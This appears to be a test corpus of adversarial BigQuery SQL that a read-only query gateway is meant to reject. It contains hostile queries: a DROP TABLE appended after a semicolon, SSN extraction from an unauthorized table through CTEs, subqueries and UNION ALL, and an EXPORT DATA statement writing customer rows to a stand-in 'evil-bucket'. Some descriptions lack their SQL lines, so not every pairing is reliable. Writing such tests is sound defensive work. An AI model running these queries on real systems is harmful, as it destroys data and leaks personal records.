description: QG-1 adversarial SQL corpus for the bigquery dialect. Every case must be rejected by aida.query_gateway.QueryExecutionGateway's single validation pipeline -- zero bypasses is the exit condition.

cases.sql: SELECT SAFE.fn_rate(c.customer_id) AS rate FROM retail.customer AS c
cases.description: the SAFE. prefix does not make an unrecognised function a built-in

cases.sql: SELECT customer_id FROM retail.customer; DROP TABLE retail.customer;
cases.description: a second statement appended after a semicolon; DDL smuggled behind a syntactically valid first statement
batching is refused even when the second statement is itself harmless -- the rule is about ungovernable batches, not about what the batch contains
a mutation submitted directly to a read-only gateway
DDL submitted where only a read-only query is accepted

cases.sql: SELECT customer_id INTO evil_table FROM retail.customer
cases.description: SELECT ... INTO writes a new table at the source under cover of a SELECT
an unbounded projection that cannot be classification-checked or masked
an implicit cross join via comma syntax -- no ON, no USING

cases.sql: SELECT customer_id FROM retail.customer c JOIN retail.account a ON true
cases.description: a join condition with the shape of an ON clause but no substance -- the same cartesian product as a cross join, disguised past a naive 'has an ON clause' check

cases.sql: SELECT customer_id FROM retail.customer c JOIN retail.account a ON 1=1
WITH leak AS (SELECT ssn FROM fin.employee) SELECT ssn FROM leak
cases.description: an unauthorized table reached only inside a CTE definition, then surfaced through the CTE's own alias

cases.sql: SELECT customer_id, (SELECT ssn FROM fin.employee LIMIT 1) AS leaked FROM retail.customer
cases.description: an unauthorized table reached through a scalar subquery in the projection list rather than the top-level FROM

cases.sql: EXPORT DATA OPTIONS(uri='gs://evil-bucket/*.csv', format='CSV') AS SELECT customer_id FROM retail.customer
cases.description: EXPORT DATA writes governed rows to an attacker-controlled GCS bucket; the wrapped SELECT is legitimate but the statement itself is not a query
dynamic SQL execution via scripting -- the string argument is never parsed or governed by this pipeline
a federated query to an external, ungoverned connection issued as an ordinary function call

cases.sql: SELECT predicted_label FROM ML.PREDICT(MODEL `proj.ds.model`, (SELECT 1 AS f)) AS p
cases.description: ML.PREDICT used as a table source referencing a model outside the approved catalog binding -- caught structurally as a table-valued source before catalog resolution even runs

cases.sql: SELECT customer_id FROM retail.customer UNION ALL SELECT ssn FROM fin.employee
cases.description: UNION ALL (BigQuery requires the explicit ALL/DISTINCT) used to append rows from a table outside the approved projection
